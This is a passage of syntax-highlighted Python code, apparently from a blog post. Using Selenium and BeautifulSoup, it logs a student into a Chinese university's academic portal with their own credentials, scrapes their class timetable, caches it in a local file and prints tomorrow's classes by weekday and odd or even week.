&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#输入浏览器内核位置，如F:\\chromedriver_win32\\chromedriver.exe&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;place&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;F:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;chromedriver_win32&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;chromedriver.exe&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#输入开学日期，格式：30 Aug 2021&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;time_to_strat &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;30 Aug 2021&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#爬取后课表的存储位置&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;stored_place &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;F:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;ProbeN1&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;timetable&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#判断明天是周几,是不是单双周&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;start_time &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;strptime(time_to_strat, &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt; %b %Y&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;start_week &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;strftime(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;%U&amp;#34;&lt;/span&gt;, start_time)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tomorrow_time_tamp &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;time()&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;86400&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tomorrow_time &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;localtime(tomorrow_time_tamp)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tomorrow_week &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;strftime(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;%U&amp;#34;&lt;/span&gt;, tomorrow_time)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;weekin &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(tomorrow_week) &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(start_week) &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#print(weekin)  #单双周&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dt &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;strftime(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;%A&amp;#34;&lt;/span&gt;,tomorrow_time)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dt_ &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Saturday&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;6&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Sunday&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Monday&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Tuesday&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Wednesday&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Thursday&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Friday&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;5&amp;#34;&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tomorrow_weekday &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; dt_[dt]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#print(tomorrow_weekday) #周几&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;time_judge&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;[weekin,tomorrow_weekday]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;print_class&lt;/span&gt;(timetable,time_judge):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(timetable[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(time_judge[&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(time_judge[&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt; :
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;明天没课!&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt; :
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;---------------------------------------------------&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (time_judge[&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#ff79c6&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            tmp &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; timetable[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;双&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(time_judge[&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;])]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; each &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; tmp&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;values():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt; (&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;4&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(each[i])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;---------------------------------------------------&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;elif&lt;/span&gt; (time_judge[&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#ff79c6&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            tmp &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; timetable[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;单&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(time_judge[&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;])]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; each &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; tmp&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;values():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt; (&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;4&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(each[i])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;---------------------------------------------------&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;timetable&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;单&amp;#34;&lt;/span&gt;:   &lt;span style=&#34;color:#6272a4&#34;&gt;#课表&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;:{},&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;:{},&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;:{},&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;:{},&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;5&amp;#34;&lt;/span&gt;:{}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            },
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;双&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;:{},&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;:{},&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;:{},&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;:{},&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;5&amp;#34;&lt;/span&gt;:{}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            },
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#开局先读取&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    a_json &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; json&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;load(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;open&lt;/span&gt;(stored_place&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;file.txt&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; a_json[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;stored&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print_class(a_json,time_judge)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;except&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    chrome_options &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; webdriver&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;ChromeOptions()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    chrome_options&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;add_experimental_option(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;detach&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ff79c6&#34;&gt;True&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    chrome_options&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;add_argument(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;--headless&amp;#39;&lt;/span&gt;)  &lt;span style=&#34;color:#6272a4&#34;&gt;#设置后台运行&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    chrome_options&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;add_experimental_option(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;excludeSwitches&amp;#39;&lt;/span&gt;, [&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;enable-logging&amp;#39;&lt;/span&gt;]) &lt;span style=&#34;color:#6272a4&#34;&gt;#让终端少输出些东西&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    driver&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;webdriver&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;Chrome(place,chrome_options&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;chrome_options)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    driver&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;http://www.zfjw.xupt.edu.cn/jwglxt/xtgl/login_slogin.html&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    elem_yhm &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; driver&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;find_elements_by_name(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;yhm&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#6272a4&#34;&gt;#查找并键入用户名,返回一个数组&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    elem_yhm &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; elem_yhm[&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    elem_yhm&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;clear()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    elem_yhm&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;send_keys(student_id)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    elem_mm &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; driver&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;find_elements_by_name(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;mm&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#6272a4&#34;&gt;#查找并键入密码&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    elem_mm &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; elem_mm[&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    elem_mm&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;clear()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    elem_mm&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;send_keys(studend_password)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    elem_mm&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;send_keys(Keys&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;RETURN)  &lt;span style=&#34;color:#6272a4&#34;&gt;# 模拟键盘回车&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    driver&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;http://www.zfjw.xupt.edu.cn/jwglxt/kbcx/xskbcx_cxXskbcxIndex.html?gnmkdm=N2151&amp;amp;layout=default&amp;amp;su=&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; student_id) &lt;span style=&#34;color:#6272a4&#34;&gt;#直接get数据库界面&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    time&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;)   &lt;span style=&#34;color:#6272a4&#34;&gt;#等待页面内的apex返回,否则soup会抓得太快&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    soup &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; BeautifulSoup(driver&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;page_source, &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;html.parser&amp;#34;&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    allclass_soup &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; soup&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;find(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;table&amp;#34;&lt;/span&gt;,{&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;kbgrid_table_0&amp;#34;&lt;/span&gt;})  &lt;span style=&#34;color:#6272a4&#34;&gt;# 获取kbgrid_table_0标签下的所有课程,allcalss是个TAG类&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;#找到用户的名字,(学号:student_id)&lt;/span&gt;
